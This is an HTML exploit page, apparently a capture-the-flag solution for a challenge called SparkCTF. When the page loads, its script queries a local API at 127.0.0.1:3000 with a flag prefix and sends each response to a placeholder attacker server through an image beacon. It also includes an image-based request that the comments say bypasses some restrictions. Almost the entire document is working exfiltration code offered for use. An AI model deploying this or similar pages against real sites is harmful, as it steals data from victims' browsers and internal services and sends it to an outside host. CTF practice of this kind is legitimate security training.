<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
</head>
<body>
    <script>
        function leakFlag() {
            let payload = "SparkCTF{";
            let externalServer = "https://your-external-server.com/log?data="; // Change this!

            // Function to send data to your external server
            function exfiltrate(data) {
                new Image().src = externalServer + encodeURIComponent(data);
            }

            // Try both HTTP and HTTPS
            let urls = [
                "http://127.0.0.1:3000/api/search?input=" + payload,
                "https://127.0.0.1:3000/api/search?input=" + payload
            ];

            urls.forEach(url => {
                fetch(url)
                    .then(response => response.text())
                    .then(data => {
                        console.log("Success:", data);
                        exfiltrate(data); // Send the response out
                    })
                    .catch(err => console.error("Error:", err));
            });

            // Image-based request (bypasses some restrictions)
            let img = new Image();
            img.src = "http://127.0.0.1:3000/api/search?input=" + payload;
            document.body.appendChild(img);
        }

        leakFlag();
    </script>
</body>
</html>
